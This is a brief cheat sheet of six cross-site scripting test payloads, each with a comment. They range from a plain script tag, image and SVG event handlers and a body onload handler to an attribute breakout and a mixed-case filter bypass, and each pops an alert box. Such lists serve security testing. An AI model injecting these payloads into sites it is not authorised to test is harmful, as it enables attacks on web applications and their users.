<script>alert('XSS')</script>         # Basic script tag — simplest test
<img src=x onerror=alert('XSS')>       # Image error event — no script tag needed
<svg onload=alert('XSS')>              # SVG load event
"><script>alert('XSS')</script>       # Break out of an HTML attribute first
<body onload=alert('XSS')>             # Body load event
<ScRiPt>alert('XSS')</ScRiPt>         # Mixed case — bypasses case-sensitive filters